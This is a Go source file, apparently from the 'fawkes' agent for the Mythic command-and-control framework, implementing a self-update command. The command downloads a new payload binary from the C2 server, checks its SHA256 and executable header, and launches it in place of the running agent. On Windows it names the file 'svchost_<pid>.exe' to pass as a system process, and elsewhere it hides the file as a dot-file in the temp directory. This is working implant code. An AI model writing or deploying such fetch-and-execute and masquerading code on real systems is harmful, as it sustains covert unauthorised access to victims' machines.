package commands

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	"fawkes/pkg/structs"
)

type configUpdateParams struct {
	Action string `json:"action"`
	FileID string `json:"file"`
	Hash   string `json:"hash"`
}

func configUpdate(task structs.Task, params configUpdateParams) structs.CommandResult {
	if params.FileID == "" {
		return errorResult("Error: file parameter is required (Mythic file ID of the new payload binary)")
	}

	tmpDir := os.TempDir()
	var tmpName string
	switch runtime.GOOS {
	case "windows":
		tmpName = fmt.Sprintf("svchost_%d.exe", os.Getpid())
	default:
		tmpName = fmt.Sprintf(".%d.tmp", os.Getpid())
	}
	tmpPath := filepath.Join(tmpDir, tmpName)

	tfResult := &structs.FileTransferResult{}
	r := structs.GetFileFromMythicStruct{}
	r.FileID = params.FileID
	r.FullPath = tmpPath
	r.Task = &task
	r.SendUserStatusUpdates = true
	r.TransferResult = tfResult
	r.StartChunk = 1
	r.ReceivedChunkChannel = make(chan []byte)

	fp, err := os.OpenFile(tmpPath, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0700)
	if err != nil {
		return errorf("Failed to create temp file %s: %v", tmpPath, err)
	}

	task.Job.GetFileFromMythic <- r

	hasher := sha256.New()
	totalBytes := 0
	var writeErr error
	for {
		chunk := <-r.ReceivedChunkChannel
		if len(chunk) == 0 {
			break
		}
		_, writeErr = fp.Write(chunk)
		if writeErr != nil {
			break
		}
		hasher.Write(chunk)
		totalBytes += len(chunk)
	}

	if closeErr := fp.Close(); closeErr != nil && writeErr == nil {
		writeErr = closeErr
	}

	if writeErr != nil {
		os.Remove(tmpPath)
		return errorf("Failed to write binary (%d bytes written): %v", totalBytes, writeErr)
	}

	if task.DidStop() {
		os.Remove(tmpPath)
		return errorResult("Update cancelled by operator")
	}

	if totalBytes == 0 {
		os.Remove(tmpPath)
		return errorResult("Downloaded file is empty — verify the file ID is correct")
	}

	computedHash := hex.EncodeToString(hasher.Sum(nil))
	if params.Hash != "" {
		expected := strings.ToLower(strings.TrimSpace(params.Hash))
		if computedHash != expected {
			os.Remove(tmpPath)
			return errorf("SHA256 mismatch: expected %s, got %s", expected, computedHash)
		}
	}

	if err := validateExecutable(tmpPath); err != nil {
		os.Remove(tmpPath)
		return errorf("Downloaded file is not a valid executable: %v", err)
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[+] Downloaded new binary: %s (%d bytes)\n", tmpPath, totalBytes))
	sb.WriteString(fmt.Sprintf("[+] SHA256: %s\n", computedHash))
	sb.WriteString("[+] Launching new agent and exiting...\n")

	launchErr := launchAndReplace(tmpPath)
	if launchErr != nil {
		os.Remove(tmpPath)
		return errorf("Failed to launch new binary: %v", launchErr)
	}

	return successResult(sb.String())
}

func validateExecutable(path string) error {
	f, err := os.Open(path)
	if err != nil {
		return err
	}
	defer f.Close()

	magic := make([]byte, 4)
	n, err := f.Read(magic)
	if err != nil || n < 4 {
		return fmt.Errorf("file too small to be an executable (%d bytes read)", n)
	}

	switch {
	case magic[0] == 0x7f && magic[1] == 'E' && magic[2] == 'L' && magic[3] == 'F':
		if runtime.GOOS == "windows" {
			return fmt.Errorf("ELF binary cannot run on Windows")
		}
		return nil
	case magic[0] == 'M' && magic[1] == 'Z':
		if runtime.GOOS != "windows" {
			return fmt.Errorf("PE binary cannot run on %s", runtime.GOOS)
		}
		return nil
	case magic[0] == 0xfe && magic[1] == 0xed && magic[2] == 0xfa:
		if runtime.GOOS != "darwin" {
			return fmt.Errorf("Mach-O binary cannot run on %s", runtime.GOOS)
		}
		return nil
	case magic[0] == 0xcf && magic[1] == 0xfa && magic[2] == 0xed && magic[3] == 0xfe:
		if runtime.GOOS != "darwin" {
			return fmt.Errorf("Mach-O binary cannot run on %s", runtime.GOOS)
		}
		return nil
	default:
		return fmt.Errorf("unrecognized format (magic: %02x %02x %02x %02x)", magic[0], magic[1], magic[2], magic[3])
	}
}
